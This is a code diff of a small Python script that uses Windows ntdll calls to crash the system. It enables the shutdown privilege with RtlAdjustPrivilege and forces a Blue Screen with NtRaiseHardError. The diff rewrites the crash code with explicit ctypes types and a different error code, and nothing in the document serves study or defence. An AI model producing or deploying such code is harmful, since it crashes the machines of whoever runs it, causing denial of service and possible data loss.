@@ -1,5 +1,24 @@
-import ctypes
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
 
-# Trigger a system crash (Blue Screen)
-ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+nullptr = POINTER(c_int)()
+
+windll.ntdll.RtlAdjustPrivilege(
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int())
+)
+
+windll.ntdll.NtRaiseHardError(
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint())
+)
